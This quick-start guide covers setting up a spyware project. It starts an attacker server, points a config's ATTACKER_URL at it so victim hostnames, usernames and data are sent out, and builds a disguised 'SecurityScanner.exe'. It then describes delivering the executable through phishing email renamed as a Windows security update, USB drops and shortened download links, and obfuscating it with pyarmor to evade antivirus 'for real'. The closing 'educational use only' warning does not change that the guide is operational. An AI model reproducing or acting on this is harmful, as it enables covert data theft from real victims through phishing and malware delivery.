# QUICK START - DATA EXFILTRATION & DELIVERY
**Fast setup guide for enabling real exfiltration and creating deliverable executable**

---

## 🚀 5-MINUTE SETUP

### **Step 1: Install Requirements (Both VMs)**

```powershell
pip install flask requests pyinstaller
```

---

### **Step 2: Start Attacker Server (Attacker VM)**

```powershell
cd malicious_code
python attacker_server.py
```

**Copy the IP address shown, example:**
```
✓ Server running at: http://192.168.1.100:5000
```

---

### **Step 3: Configure Spyware (Attacker VM)**

Edit `config.py`:
```python
ATTACKER_URL = "http://192.168.1.100:5000/receive"  # Your IP from Step 2
USE_REAL_EXFILTRATION = True  # Change to True
```

---

### **Step 4: Build Executable (Attacker VM)**

```powershell
cd malicious_code
python build_executable.py
```

**Output:** `dist\SecurityScanner.exe`

---

### **Step 5: Test (Victim VM)**

**Option A: Test with Python (quick test)**
```powershell
python test_exfiltration.py  # Tests connection first
python spyware_main.py        # Run full spyware
```

**Option B: Test with EXE (realistic test)**
- Copy `dist\SecurityScanner.exe` to victim desktop
- Double-click to run
- Click "Start Security Scan"

---

### **Step 6: Verify**

**On Attacker Console:**
```
✓ DATA RECEIVED FROM VICTIM!
Hostname: VICTIM-PC
Username: JohnDoe
```

**On Attacker Disk:**
Check folder: `received_victim_data/`

---

## 📦 DELIVERY OPTIONS

### **Email (Rename first)**
```powershell
Rename-Item "dist\SecurityScanner.exe" "WindowsSecurityUpdate.exe"
```
Attach to phishing email with convincing message

### **USB Drive**
```powershell
Copy-Item "dist\SecurityScanner.exe" "E:\SecurityTool.exe"
```
Add README.txt with instructions

### **Download Link**
- Upload to Google Drive / Dropbox
- Share link via email/social media
- Use bit.ly to shorten URL

---

## 🔍 TROUBLESHOOTING

### No Data Received?
```powershell
# 1. Check attacker server is running
# 2. Test connection
python test_exfiltration.py

# 3. Check firewall
netsh advfirewall firewall add rule name="AttackerServer" dir=in action=allow protocol=TCP localport=5000

# 4. Verify config.py
#    - ATTACKER_URL matches server IP
#    - USE_REAL_EXFILTRATION = True
```

### Build Failed?
```powershell
# 1. Install PyInstaller
pip install pyinstaller

# 2. Run as Administrator
# 3. Clear cache
pyinstaller --clean
```

### AV Blocks Executable?
```powershell
# For testing: Add to AV exceptions
# For real: Use obfuscation
pip install pyarmor
pyarmor obfuscate spyware_main.py
```

---

## 📚 FULL DOCUMENTATION

- **Complete Setup:** `SETUP_GUIDE.md`
- **Delivery Methods:** `DELIVERY_METHODS.md`
- **Project Overview:** `README.md`

---

## ⚠️ LEGAL WARNING

**EDUCATIONAL USE ONLY - Virtual Machines ONLY**

✅ Allowed: Testing on your own VMs for learning
❌ Illegal: Deploying on systems without authorization

Violating this can result in criminal prosecution.
